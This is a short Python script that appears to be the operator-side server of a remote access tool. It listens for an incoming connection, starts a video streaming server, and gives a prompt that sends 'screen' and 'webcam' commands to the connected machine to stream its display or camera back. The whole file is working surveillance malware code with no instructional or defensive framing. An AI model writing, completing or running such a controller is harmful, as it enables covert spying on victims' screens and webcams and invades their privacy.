from vidstream import *
from colorama import init, Fore
import socket
import os

init()

local_ip_address = socket.gethostbyname(socket.gethostname())
socket_port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP connection
s.bind((local_ip_address, socket_port))
s.listen(5)

client, addr = s.accept()
network_name = client.recv(1024).decode("utf-8") # Receive 1024 bytes of data

print(f"[+] {addr[0]} ({addr[1]}) | {network_name}")

server = StreamingServer(local_ip_address, 9999)
server.start_server()
print("[~] Server was successfully started")

while True:
	cmd = input(f"{Fore.RED}{addr[0]}@{network_name}~#{Fore.RESET}{Fore.BLUE} ")

	if cmd == "screen":
		client.send(cmd.encode("utf-8"))
	elif cmd == "webcam":
		client.send(cmd.encode("utf-8"))
	elif cmd == "clear":
		os.system("cls")